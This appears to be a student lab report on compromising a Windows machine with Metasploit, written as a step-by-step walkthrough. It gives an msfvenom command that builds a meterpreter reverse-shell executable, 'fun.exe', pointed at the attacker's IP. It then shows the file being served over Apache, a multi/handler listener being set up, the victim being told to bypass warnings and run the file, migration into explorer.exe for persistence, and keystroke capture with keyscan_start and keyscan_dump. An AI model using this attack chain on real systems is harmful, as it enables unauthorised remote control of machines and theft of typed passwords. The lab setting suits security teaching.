# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="900" height="335" alt="image" src="https://github.com/user-attachments/assets/0c9e69ee-70bf-4ca2-b4c6-31b464691863" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="962" height="136" alt="image" src="https://github.com/user-attachments/assets/f9e1ba27-abd4-4dfc-b52d-931466d4b3ca" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="957" height="76" alt="image" src="https://github.com/user-attachments/assets/885e556e-6b61-4616-b84d-1ecea5d459ef" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="940" height="67" alt="image" src="https://github.com/user-attachments/assets/b6ed15f0-ef08-4b73-ab60-ffdedc992d71" />


Check the status of apache2
## OUTPUT:

<img width="942" height="401" alt="image" src="https://github.com/user-attachments/assets/b8e4ff8a-684e-45d2-a14b-4ad58bbd6fb9" />


Invoke msfconsole:
## OUTPUT:

<img width="952" height="543" alt="image" src="https://github.com/user-attachments/assets/a52a0a97-6ffc-4f15-85ca-4db29f9f3684" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="958" height="1031" alt="image" src="https://github.com/user-attachments/assets/77850ff5-7f87-4e56-841e-9d05c00f7b2a" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="952" height="337" alt="image" src="https://github.com/user-attachments/assets/bd6e3ebb-f775-4345-98f0-4e6d6dc24608" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="892" height="690" alt="image" src="https://github.com/user-attachments/assets/6173fe3d-b759-49b2-ab42-b1f6fe8f7070" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="922" height="122" alt="image" src="https://github.com/user-attachments/assets/c9d79f4e-46eb-4c9f-b497-5aea0d8af77c" />


On kali/parrot give the command exploit
## OUTPUT:

<img width="942" height="293" alt="image" src="https://github.com/user-attachments/assets/e8f4e602-61b7-4b10-b5d5-d1bb9ae4a97c" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="945" height="1072" alt="image" src="https://github.com/user-attachments/assets/1a61df1e-28b1-4340-8081-b5720df9cc76" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:

<img width="965" height="116" alt="image" src="https://github.com/user-attachments/assets/9af31705-940d-4d8b-a81a-14bf5666b627" />

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="943" height="1047" alt="image" src="https://github.com/user-attachments/assets/a8321e14-2b87-40e9-a052-e00a826f62c4" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="897" height="722" alt="image" src="https://github.com/user-attachments/assets/bec44485-3a11-422d-8396-92ca088a4d48" />

keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="953" height="168" alt="image" src="https://github.com/user-attachments/assets/1a1c512f-0cea-48a1-a476-5af898ae2000" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
